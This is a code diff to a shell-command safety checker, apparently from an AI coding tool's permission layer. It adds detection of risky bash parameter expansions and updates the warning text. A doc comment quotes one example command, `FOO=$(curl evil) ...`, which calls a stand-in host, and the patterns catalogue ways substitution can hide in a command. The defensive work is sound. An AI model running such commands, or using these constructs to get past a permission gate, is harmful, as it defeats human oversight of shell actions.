@@ -1518,7 +1518,8 @@ export function hasUnsafeMonitorBackgroundOperator(command: string): boolean {
 }
 
 /**
- * Detects command substitution patterns in a shell command, following bash quoting rules:
+ * Detects command substitution and risky parameter expansion in a shell command,
+ * following bash quoting rules:
  * - Single quotes ('): Everything literal, no substitution possible
  * - Double quotes ("): Command substitution with $() and backticks unless escaped with \
  * - No quotes: Command substitution with $(), <(), and backticks
@@ -1529,9 +1530,19 @@ export function hasUnsafeMonitorBackgroundOperator(command: string): boolean {
  * - If a heredoc delimiter is unquoted (e.g. `<<EOF`), bash will perform
  *   expansions in the heredoc body, so command substitution is blocked there too.
  * @param command The shell command string to check
- * @returns true if command substitution would be executed by bash
+ * @returns true if bash may execute nested shell code during expansion
  */
 export function detectCommandSubstitution(command: string): boolean {
+  const startsRiskyParameterExpansion = (text: string, index: number) => {
+    const expansion = text.slice(index).replaceAll('\\\n', '');
+    return (
+      /^\$\{!/.test(expansion) ||
+      /^\$\{#?(?:[A-Za-z_][A-Za-z0-9_]*|[0-9]+|[*@$?!-])(?:\[[^\]]*\])?@[A-Za-z]\}/.test(
+        expansion,
+      )
+    );
+  };
+
   type PendingHeredoc = {
     delimiter: string;
     isQuotedDelimiter: boolean;
@@ -1684,6 +1695,14 @@ export function detectCommandSubstitution(command: string): boolean {
         return true;
       }
 
+      if (
+        char === '$' &&
+        nextChar === '{' &&
+        startsRiskyParameterExpansion(line, i)
+      ) {
+        return true;
+      }
+
       if (char === '`') {
         return true;
       }
@@ -1741,7 +1760,8 @@ export function detectCommandSubstitution(command: string): boolean {
         if (!heredoc.isQuotedDelimiter) {
           if (
             pendingDollarLineContinuation &&
-            (effectiveLine.startsWith('(') || effectiveLine.startsWith('{'))
+            (effectiveLine.startsWith('(') ||
+              startsRiskyParameterExpansion(`$${effectiveLine}`, 0))
           ) {
             return { nextIndex: i, hasSubstitution: true };
           }
@@ -1866,6 +1886,7 @@ export function detectCommandSubstitution(command: string): boolean {
     // Handle escaping - only works outside single quotes
     if (char === '\\' && !inSingleQuotes) {
       if (nextChar === '\n') {
+        // Bash does not remove `\\<CRLF>`; the backslash only escapes the CR.
         // `\<newline>` is a line continuation: bash removes both characters,
         // making the surrounding characters adjacent. Preserve the pending
         // adjacency so `$`/`<`/`>` + continuation + `(` is still detected;
@@ -1897,7 +1918,9 @@ export function detectCommandSubstitution(command: string): boolean {
           !lastSignificantWasEscaped &&
           lastSignificantChar === '$' &&
           !lastSignificantInSingleQuotes &&
-          lastSignificantInDoubleQuotes === inDoubleQuotes
+          lastSignificantInDoubleQuotes === inDoubleQuotes &&
+          (char === '(' ||
+            startsRiskyParameterExpansion(`$${command.slice(i)}`, 0))
         ) {
           return true;
         }
@@ -1950,6 +1973,14 @@ export function detectCommandSubstitution(command: string): boolean {
         return true;
       }
 
+      if (
+        char === '$' &&
+        nextChar === '{' &&
+        startsRiskyParameterExpansion(command, i)
+      ) {
+        return true;
+      }
+
       // <(...) process substitution - works unquoted only (not in double quotes)
       if (char === '<' && nextChar === '(' && !inDoubleQuotes && !inBackticks) {
         return true;
@@ -1982,17 +2013,17 @@ export function detectCommandSubstitution(command: string): boolean {
 
 /**
  * User-facing warning emitted when a shell-tool invocation contains
- * command substitution (`$(...)`, backticks, `<(...)`, or `>(...)`).
+ * command substitution or risky parameter expansion.
  * Shared across the shell-tool and monitor-tool confirmation paths so
  * the wording can't drift between sites — see #4386 review (round 3).
  */
 export const COMMAND_SUBSTITUTION_WARNING =
-  'Contains command substitution ($(...), backticks, <(...), or >(...)).';
+  'Contains command substitution or risky parameter expansion ($(...), backticks, <(...), >(...), ${...@...}, or ${!...}).';
 
 /**
- * Single dual-check predicate: does the command contain shell command
- * substitution either as written (raw) or after `stripShellWrapper`
- * unwraps it? The raw check catches substitution that lives inside
+ * Single dual-check predicate: does the command contain shell substitution
+ * or risky parameter expansion either as written (raw) or after
+ * `stripShellWrapper` unwraps it? The raw check catches substitution inside
  * leading env-prefix tokens (e.g. `FOO=$(curl evil) bash -c 'echo ok'`,
  * where stripShellWrapper discards the env-prefix AND unwraps to
  * `echo ok`, leaving no trace of the substitution). The stripped
@@ -2003,11 +2034,11 @@ export const COMMAND_SUBSTITUTION_WARNING =
  * Used by `buildShellExecWarnings` (UI warning surface),
  * `shouldAuditSubstitutionBypass` (audit log gate), and the
  * pre-AST gates in `ShellToolInvocation.getDefaultPermission`,
- * `MonitorToolInvocation.getDefaultPermission`, and
- * `PermissionManager.resolveDefaultPermission`. Centralising the
- * dual-check here keeps detection semantics in lockstep across all
- * surfaces (a change here propagates to every consumer). See PR #4386
- * round 6 for the env-prefix wrapper regression that motivated this.
+ * `MonitorToolInvocation.getDefaultPermission`, and the shared
+ * `isShellCommandReadOnlyAST` classifier used by `PermissionManager`.
+ * Centralising the dual-check here keeps detection semantics in lockstep
+ * across all surfaces. See PR #4386 round 6 for the env-prefix wrapper
+ * regression that motivated this.
  */
 export function hasShellSubstitution(rawCommand: string): boolean {
   if (typeof rawCommand !== 'string' || rawCommand.length === 0) return false;
